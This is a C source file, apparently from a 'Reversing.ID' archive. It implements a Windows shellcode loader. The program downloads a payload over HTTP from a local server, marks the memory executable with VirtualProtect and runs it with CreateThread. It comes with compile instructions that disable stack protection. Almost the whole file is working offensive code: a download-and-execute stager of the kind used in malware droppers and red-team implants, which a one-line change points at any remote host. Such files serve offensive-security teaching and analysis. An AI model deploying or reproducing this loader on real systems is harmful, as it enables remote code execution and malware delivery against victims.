/*
    Shellcode Loader
    Archive of Reversing.ID

    Download shellcode over HTTP.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    InternetReadFile
    - permission: VirtualProtect
    - execution:  CreateThread

Note:
    - shellcode array is served in localhost
    - synchronous (GET 127.0.0.1:8000/shellcode.bin)
*/

#include <windows.h>
#include <stdint.h>
#include <wininet.h>

#pragma comment(lib,"wininet")


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    DWORD       nread;
    uint32_t    payload_len = 4096;

    char        host[]  = "127.0.0.1";
    uint16_t    port    = 8000;
    char        path[]  = "/shellcode.bin";

    HINTERNET   session;
    HINTERNET   conn;
    HINTERNET   reqfile;
    
    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // download the shellcode 
    // -- create session using default setting
    session = InternetOpen ("Reversing.ID Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    // -- create connection to localhost
    conn = InternetConnect (session, host, port, "", "", INTERNET_SERVICE_HTTP, 0, 0);

    // -- create request
    reqfile = HttpOpenRequest (conn, "GET", path, NULL, NULL, NULL, 0, 0);

    // -- send request and read response
    HttpSendRequest (reqfile, NULL, 0, 0, 0);
    InternetReadFile (reqfile, runtime, payload_len, &nread);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    // close all handle
    InternetCloseHandle (reqfile);
    InternetCloseHandle (conn);
    InternetCloseHandle (session);

    // deallocate
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}